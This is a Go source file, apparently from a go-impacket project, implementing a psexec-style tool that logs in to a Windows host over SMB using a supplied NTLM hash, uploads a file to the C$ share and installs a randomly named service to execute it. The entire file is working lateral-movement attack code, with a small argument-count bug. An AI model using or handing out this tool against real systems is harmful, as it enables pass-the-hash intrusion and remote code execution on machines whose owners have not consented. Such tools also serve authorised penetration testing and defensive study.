package main

import (
	"fmt"
	"go-impacket/pkg/smb/smb2"
	"go-impacket/pkg/util"
	"log"
	"os"
)

// 1.查找可用共享目录
// 2.上传命令执行工具
// 3.打开远程服务
// 4.创建服务并启动

func main() {
	if len(os.Args) != 6 {
		log.Fatalln("Usage: psexec <target/hosts> <user> <domain> <hash> <file> <filepath>")
	}

	options := smb2.Options{
		User:   os.Args[2],
		Domain: os.Args[3],
		//Password: "123456",
		Hash: os.Args[4],
		Port: 445,
	}

	options.Host = os.Args[1]

	session, err := smb2.SMB2NewSession(options, true)
	if err != nil {
		fmt.Printf("[-] Login failed [%s]: %s\n", options.Host, err)
	}
	defer session.Close()
	if session.IsAuthenticated {
		fmt.Printf("[+] Login successful [%s]\n", options.Host)
	}
	// 上传文件到目标
	treeId, err1 := session.SMB2TreeConnect("C$")
	if err1 != nil {
		session.Debug("", err1)
	}
	fileName := os.Args[5]
	filePath := os.Args[6]
	r := smb2.SMB2CreateRequestStruct{
		OpLock:             smb2.SMB2_OPLOCK_LEVEL_NONE,
		ImpersonationLevel: smb2.Impersonation,
		AccessMask:         smb2.FILE_CREATE,
		FileAttributes:     smb2.FILE_ATTRIBUTE_NORMAL,
		ShareAccess:        smb2.FILE_SHARE_WRITE,
		CreateDisposition:  smb2.FILE_OVERWRITE_IF,
		CreateOptions:      smb2.FILE_NON_DIRECTORY_FILE,
	}
	fileId, err2 := session.SMB2CreateRequest(treeId, fileName, r)
	if err2 != nil {
		session.Debug("", err2)
	}
	err = session.SMB2WriteRequest(treeId, filePath, fileName, fileId)
	if err != nil {
		session.Debug("", err)
	}
	servicename := string(util.Random(4))
	uploadPathFile := "%SYSTEMDRIVE%\\testt.exe"
	// 创建服务并启动
	err = session.ServiceInstall(servicename, uploadPathFile)
	if err != nil {
		session.Debug("", err)
	}
}
